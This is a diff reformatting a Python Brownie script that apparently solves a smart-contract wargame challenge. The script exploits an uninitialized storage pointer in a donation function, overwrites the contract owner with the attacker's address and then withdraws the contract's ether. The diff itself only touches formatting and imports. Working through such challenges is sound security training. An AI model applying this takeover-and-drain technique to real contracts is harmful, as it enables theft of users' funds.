@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 from brownie import web3
+from colorama import Fore
 from scripts.deploy import deploy
 from scripts.helpful_scripts import get_account
-from colorama import Fore
 
 # * colours
 green = Fore.GREEN
@@ -30,8 +30,10 @@ def hack(contract_address=None, attacker=None):
     prev_ower = target.owner()
     print_colour(target.isComplete())
 
-    print(f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}")
-    
+    print(
+        f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}"
+    )
+
     """
         Donation donation; is an uninitialized storage pointer
         used kind of like reference values in C++)
@@ -47,30 +49,29 @@ def hack(contract_address=None, attacker=None):
     """
 
     eth_amount = web3.toInt(hexstr=attacker.address)
-    #print(eth_amount)
+    # print(eth_amount)
 
     msg_value = eth_amount // 10**36
-    #print(msg_value)
+    # print(msg_value)
 
     #! Hack
     tx = target.donate(eth_amount, {"from": attacker, "value": msg_value})
     tx.wait(1)
 
-    
     print(f"{magenta}Previous owner: {green}{prev_ower}{reset}")
     print(f"{magenta}Current owner:  {red}{target.owner()}{reset}")
     print(f"{magenta}Attacker:       {red}{target.owner()}{reset}")
-    
 
-    #? first assertion
+    # ? first assertion
     assert target.owner() == attacker.address
-    
+
     #! now we are owner so let's withdraw the funds
     tx = target.withdraw({"from": attacker})
     tx.wait(1)
 
-    print(f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}")
-
+    print(
+        f"{magenta}Contract balance: {red}{web3.fromWei(target.balance(),'ether')} ETH{reset}"
+    )
 
     print_colour(target.isComplete())
 
